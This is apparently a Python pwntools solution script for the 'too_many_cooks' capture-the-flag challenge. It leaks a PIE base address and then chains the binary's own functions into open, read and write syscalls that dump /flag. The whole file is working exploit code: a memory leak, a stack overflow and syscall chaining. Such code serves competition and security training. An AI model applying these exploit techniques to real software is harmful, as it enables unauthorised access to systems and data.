#!/usr/bin/python3

from pwn import *

vuln = ELF("too_many_cooks")

if args.REMOTE:
    p = remote("taki-taki--card-4238.ctf.kitctf.de", "443", ssl=True)
else:
    p = process("./too_many_cooks")

leak_predec = [
    b"",
    b"%%%*3010",
    b"4470634947682243266378903880",
    b"%%    %#3249",
    b"%0917779825523131271683423008",
    b"882**378548380720*15284747658",
    b"%%%*4321293",
    b"2132*+80624162+*",
    b"36741856613777630410503",
    b"+78252141368908973292357069"
]

#leak PIE
p.recvuntil(b"selection: ")
p.sendline("leek_soup")
idx = int(chr(p.recvuntil(b"9084019048700", drop=True)[-1]))
p.recvuntil(leak_predec[idx])
leak = int(p.recvn(15).decode())
vuln.address = leak - vuln.symbols["serve_leek"]
p.recvuntil(b"Welcome")
info(f"PIE @ {hex(vuln.address)}")
p.recvuntil(b"selection: ")
p.sendline(b"main")

#allocate some space on the stack -> turned out to be unecessary
for _ in range(0):
    p.recvuntil(b"selection: ")
    p.sendline(b"a")
    p.recvuntil(b"selection: ")
    p.sendline(b"main")

DOUBLE = p64(vuln.symbols["flip"])
INCR = p64(vuln.symbols["heat"])
DECR = p64(vuln.symbols["cool"])
FWD = p64(vuln.symbols["salt"])
BWD = p64(vuln.symbols["pepper"])
EXEC = p64(vuln.symbols["serve"])
FWD_WORD = 8*FWD
BWD_WORD = 8*BWD

def clear_byte() -> bytes:
    """clears the current byte"""
    return DOUBLE * 8

def set_byte(b:int) -> bytes:
    """
    sets the value of a byte at the current address, assumes 0
    """
    assert b < 256
    payload = b""
    if b == 0:
        return b""
    b_bin = bin(b)[3:]
    payload += INCR
    for c in b_bin:
        payload += DOUBLE
        if c == "1":
            payload += INCR
    return payload

def clear_word() -> bytes:
    """
    clears a 8 byte word, advances cursor
    """
    return 8*(clear_byte() + FWD)

def set_word(w:int):
    """
    sets a 8 byte word, assume 0
    """
    payload = b""
    for b in p64(w):
        payload += set_byte(b)
        payload += FWD
    return payload

SYS_OPEN = 2
SYS_READ = 0
SYS_WRITE = 1

#ROP -> build arguments and syscalls
payload = b""
payload += b"A"*16 #fill buf
payload += p64(0) #saved rbp
#open("/flag")
payload += set_word(SYS_OPEN) #rax
payload += set_word(vuln.symbols["kitchen"] + 0x22) #rdi
payload += FWD_WORD #rsi
payload += FWD_WORD #rdx
payload += set_byte(0xf) + FWD + set_byte(0x5)#syscall
for c in b"/flag":
    payload += FWD + set_byte(c)
payload += 5*BWD
payload += EXEC
#read
payload += 0x21*BWD
payload += clear_byte()
payload += FWD_WORD #rax
payload += clear_word() + BWD_WORD + set_word(3) #rdi
payload += set_word(vuln.symbols["kitchen"] + 0x80) #rsi
payload += set_word(0x100) #rdx
payload += FWD
payload += EXEC
#write
payload += 0x21*BWD
payload += set_word(1) #rax
payload += clear_byte() + set_word(1) #rdi
payload += 0x11*FWD
payload += EXEC

assert len(payload) % 8 == 0, len(payload)
assert len(payload) < 0x1000, len(payload)

#finishing up
p.sendline(payload)
p.recvuntil(b"selection: ")
p.sendline(b"none")
p.recvuntil(b"but ok\n")
flag = p.recvuntil(b"}")
info(flag.decode())
p.close()